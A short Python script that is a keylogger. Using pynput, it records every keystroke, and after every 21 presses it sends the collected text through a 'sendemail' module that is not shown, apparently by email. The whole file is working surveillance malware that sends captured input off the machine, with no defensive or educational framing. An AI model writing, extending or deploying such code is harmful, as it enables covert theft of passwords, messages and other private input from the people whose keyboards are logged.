import pynput
from pynput.keyboard import Key,Listener
import sendemail
count=0
keys=[]
def onPress(key):
    print(key,end=" ")
    print("pressed")
    global keys,count
    keys.append(str(key)+"\n")
    count+=1
    if count>20:
        count=0
        email(keys)

def email(keys):
    message=""
    for key in keys:
        K=key.replace("''",'')
        if key=="Key.space":
            K=" "

        elif key.find("Key")>0:
            K=""
        
        message+=K
    print(message)
    sendemail.sendemail(message)

def onRelease(key):
    if key==Key.esc:
        return False

with Listener(on_press=onPress,on_release=onRelease)as listener:
    listener.join()
